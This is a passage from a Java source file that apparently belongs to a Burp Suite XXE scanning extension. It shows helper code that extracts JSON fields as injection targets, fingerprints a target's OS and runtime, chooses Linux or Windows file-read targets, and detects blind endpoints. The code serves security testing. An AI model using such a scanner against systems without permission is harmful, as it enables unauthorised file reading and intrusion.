     * Recursively extracts JSON key-value pairs as XInclude injection targets.
     * Uses dot-notation for nested keys (e.g., "user.profile.name").
     * Only extracts leaf-level string and numeric primitive values.
     */
    private void extractJsonTargetsRecursive(com.google.gson.JsonObject obj, String prefix, List<XxeTarget> targets) {
        for (String key : obj.keySet()) {
            com.google.gson.JsonElement val = obj.get(key);
            String fullKey = prefix.isEmpty() ? key : prefix + "." + key;
            if (val.isJsonPrimitive()) {
                if (val.getAsJsonPrimitive().isString()) {
                    targets.add(new XxeTarget(fullKey, val.getAsString(), XxeTargetType.JSON));
                } else if (val.getAsJsonPrimitive().isNumber()) {
                    targets.add(new XxeTarget(fullKey, val.getAsString(), XxeTargetType.JSON));
                }
            } else if (val.isJsonObject()) {
                extractJsonTargetsRecursive(val.getAsJsonObject(), fullKey, targets);
            }
        }
    }

    /**
     * Retrieves the Content-Type header value from the request.
     */
    private String getContentType(HttpRequest request) {
        for (var h : request.headers()) {
            if (h.name().equalsIgnoreCase("Content-Type")) {
                return h.value().toLowerCase();
            }
        }
        return null;
    }

    /**
     * Checks whether a content type string indicates XML.
     */
    private boolean isXmlContentType(String contentType) {
        if (contentType == null) return false;
        String ct = contentType.toLowerCase();
        for (String xmlCt : XML_CONTENT_TYPES) {
            if (ct.contains(xmlCt)) return true;
        }
        return false;
    }

    /**
     * Finds new content in the response that was not present in the baseline.
     * Returns a trimmed string of the new content, or null if no significant difference.
     */
    private String findNewContent(String baseline, String response) {
        if (response == null || baseline == null) return null;
        // Simple heuristic: if the response is longer and contains content not in baseline
        if (response.length() <= baseline.length()) return null;

        // Extract portions of the response not found in the baseline
        // Use a simple line-by-line diff approach
        Set<String> baselineLines = new HashSet<>(Arrays.asList(baseline.split("\\n")));
        StringBuilder newContent = new StringBuilder();
        for (String line : response.split("\\n")) {
            String trimmed = line.trim();
            if (!trimmed.isEmpty() && !baselineLines.contains(line)) {
                if (newContent.length() > 0) newContent.append("\n");
                newContent.append(trimmed);
            }
        }
        String result = newContent.toString().trim();
        return result.isEmpty() ? null : result;
    }

    /**
     * Extracts the URL path (without query string) from a full URL.
     */
    private String extractPath(String url) {
        try {
            if (url.contains("://")) url = url.substring(url.indexOf("://") + 3);
            int s = url.indexOf('/');
            if (s >= 0) {
                int q = url.indexOf('?', s);
                return q >= 0 ? url.substring(s, q) : url.substring(s);
            }
        } catch (Exception ignored) {}
        return url;
    }

    /**
     * Delay between requests to the same host to avoid overwhelming the target.
     */
    private void perHostDelay() throws InterruptedException {
        int delay = config.getInt("xxe.perHostDelay", 500);
        if (delay > 0) Thread.sleep(delay);
    }

    // ==================== TARGET FINGERPRINTING ====================

    /**
     * Inspects response headers and body to determine the target's OS and runtime.
     * Reduces irrelevant requests and false positives by tailoring payloads.
     */
    private TargetFingerprint fingerprint(HttpRequestResponse requestResponse) {
        HttpResponse response = requestResponse.response();
        if (response == null) return new TargetFingerprint(DetectedOS.UNKNOWN, DetectedRuntime.UNKNOWN);

        DetectedOS os = DetectedOS.UNKNOWN;
        DetectedRuntime runtime = DetectedRuntime.UNKNOWN;

        for (var h : response.headers()) {
            String name = h.name().toLowerCase();
            String value = h.value().toLowerCase();

            if (name.equals("server")) {
                if (value.contains("microsoft") || value.contains("iis")) {
                    os = DetectedOS.WINDOWS;
                } else if (value.contains("apache") || value.contains("nginx")
                        || value.contains("ubuntu") || value.contains("debian")
                        || value.contains("centos") || value.contains("unix")) {
                    os = DetectedOS.LINUX;
                }
                if (value.contains("tomcat") || value.contains("jetty") || value.contains("jboss")
                        || value.contains("wildfly") || value.contains("weblogic")
                        || value.contains("websphere") || value.contains("glassfish")) {
                    runtime = DetectedRuntime.JAVA;
                }
            }

            if (name.equals("x-powered-by")) {
                if (value.contains("php")) {
                    runtime = DetectedRuntime.PHP;
                    if (os == DetectedOS.UNKNOWN) os = DetectedOS.LINUX;
                } else if (value.contains("asp.net")) {
                    runtime = DetectedRuntime.DOTNET;
                    os = DetectedOS.WINDOWS;
                } else if (value.contains("express") || value.contains("node")) {
                    runtime = DetectedRuntime.NODEJS;
                } else if (value.contains("servlet")) {
                    runtime = DetectedRuntime.JAVA;
                }
            }

            if (name.equals("x-aspnet-version") || name.equals("x-aspnetmvc-version")) {
                runtime = DetectedRuntime.DOTNET;
                os = DetectedOS.WINDOWS;
            }
        }

        // Fallback: check response body for technology indicators
        if (runtime == DetectedRuntime.UNKNOWN) {
            try {
                String body = response.bodyToString();
                if (body != null) {
                    String lower = body.toLowerCase();
                    if (lower.contains("javax.") || lower.contains("java.lang.")
                            || lower.contains("springframework") || lower.contains("at org.apache.")) {
                        runtime = DetectedRuntime.JAVA;
                    } else if (lower.contains("__viewstate") || lower.contains("asp.net")
                            || lower.contains("system.web")) {
                        runtime = DetectedRuntime.DOTNET;
                        if (os == DetectedOS.UNKNOWN) os = DetectedOS.WINDOWS;
                    } else if (lower.contains("php warning") || lower.contains("php error")
                            || lower.contains("php fatal") || lower.contains("simplexml")) {
                        runtime = DetectedRuntime.PHP;
                        if (os == DetectedOS.UNKNOWN) os = DetectedOS.LINUX;
                    }
                }
            } catch (Exception ignored) {}
        }

        return new TargetFingerprint(os, runtime);
    }

    /**
     * Returns Linux file targets filtered by fingerprint.
     * Known Windows → empty. Otherwise → full set (already minimal).
     */
    private String[][] getLinuxTargets(TargetFingerprint fp) {
        return fp.os == DetectedOS.WINDOWS ? new String[0][] : LINUX_FILE_TARGETS;
    }

    /**
     * Returns Windows file targets filtered by fingerprint.
     * Known Linux → empty. Otherwise → full set (already minimal).
     */
    private String[][] getWindowsTargets(TargetFingerprint fp) {
        return fp.os == DetectedOS.LINUX ? new String[0][] : WINDOWS_FILE_TARGETS;
    }

    /**
     * Checks if the endpoint reflects XML content back in the response.
     * If not, the endpoint is "blind" — OOB payloads should be prioritized
     * and classic file read skipped (it would only produce false positives).
     */
    private boolean isBlindEndpoint(HttpRequestResponse original, String requestBody) {
        String probe = "OMNISTRIKE_XXE_REFLECT_" + (System.currentTimeMillis() % 100000);
        String probeBody = injectEntityReferenceIntoFirstElement(requestBody, probe);
        HttpRequestResponse probeResult = sendRawRequest(original, probeBody);
        if (probeResult == null || probeResult.response() == null) return true;
        String responseBody = probeResult.response().bodyToString();
        return responseBody == null || !responseBody.contains(probe);
    }

    @Override
    public void destroy() { }

    // ==================== INNER TYPES ====================

    private enum DetectedOS { LINUX, WINDOWS, UNKNOWN }
    private enum DetectedRuntime { JAVA, DOTNET, PHP, PYTHON, RUBY, NODEJS, UNKNOWN }

    private static class TargetFingerprint {
        final DetectedOS os;
        final DetectedRuntime runtime;
        TargetFingerprint(DetectedOS os, DetectedRuntime runtime) {
            this.os = os;
            this.runtime = runtime;
        }
    }

    private enum XxeTargetType { QUERY, BODY, COOKIE, JSON, HEADER }

    private static class XxeTarget {
        final String name;
        final String originalValue;
        final XxeTargetType type;

        XxeTarget(String n, String v, XxeTargetType t) {
            name = n;
            originalValue = v != null ? v : "";
            type = t;
        }
    }

}
